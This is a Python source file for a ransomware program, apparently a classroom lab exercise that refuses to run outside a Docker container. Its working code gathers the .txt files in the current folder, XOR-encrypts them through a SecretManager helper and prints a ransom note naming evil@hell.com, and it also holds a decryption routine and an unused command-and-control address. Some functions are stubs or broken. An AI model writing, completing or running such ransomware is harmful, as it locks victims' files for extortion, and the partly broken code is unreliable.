import logging
import socket
import re
import os
import sys
import cryptography
import base64
import secrets
from pathlib import Path
from secret_manager import SecretManager
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC


CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"

ENCRYPT_MESSAGE = """
  _____                                                                                           
 |  __ \                                                                                          
 | |__) | __ ___ _ __   __ _ _ __ ___   _   _  ___  _   _ _ __   _ __ ___   ___  _ __   ___ _   _ 
 |  ___/ '__/ _ \ '_ \ / _` | '__/ _ \ | | | |/ _ \| | | | '__| | '_ ` _ \ / _ \| '_ \ / _ \ | | |
 | |   | | |  __/ |_) | (_| | | |  __/ | |_| | (_) | |_| | |    | | | | | | (_) | | | |  __/ |_| |
 |_|   |_|  \___| .__/ \__,_|_|  \___|  \__, |\___/ \__,_|_|    |_| |_| |_|\___/|_| |_|\___|\__, |
                | |                      __/ |                                               __/ |
                |_|                     |___/                                               |___/ 

Your txt files have been locked. Send an email to evil@hell.com with title '{token}' to unlock your data. 
"""
class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    def get_files(self, filter:str)->list:
        # return all files matching the filter
        files=[]
        for file in os.listdir():
            if file.endswith(".txt"):
                files.append(file)
        return files
        #raise NotImplemented()

    def do_derivation(self,salt:bytes, key:bytes):
        # derive a key from the salt and the key
        salt = bytes("16", "utf8")
        kdf = PBKDF2HMAC(
            algorithm=hashes.SHA256(),
            length=32,
            salt=salt,
            iterations=100000,
        )
        key = kdf.derive(key)

        #raise NotImplemented()

    def create(self):
        # main function for creating the ransomware (see PDF)
        return ()

    def encrypt(self):
        # main function for encrypting (see PDF)
        files = self.get_files(".txt")
        secretM = SecretManager()
        secretM.setup()
        secretM.xorfiles(files)
        #print a message with the token with hex format
        print(ENCRYPT_MESSAGE.format(token=secretM.get_token().hex()))

    def decrypt(self):
        # main function for decrypting
        key = base64.b64decode(input("Enter the key: "))
        secretM = SecretManager()
        if (secretM.check_key(key)):
            secretM.set_key(key)
            secretM.xorfiles(self.get_files(".txt"))
            secretM.clean()
            print("Everything is ok , the files have been decrypted")
            sys.exit(0)
        else:
            print("Error: Wrong key")
            # ask for the key again
            self.decrypt()
        



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt() 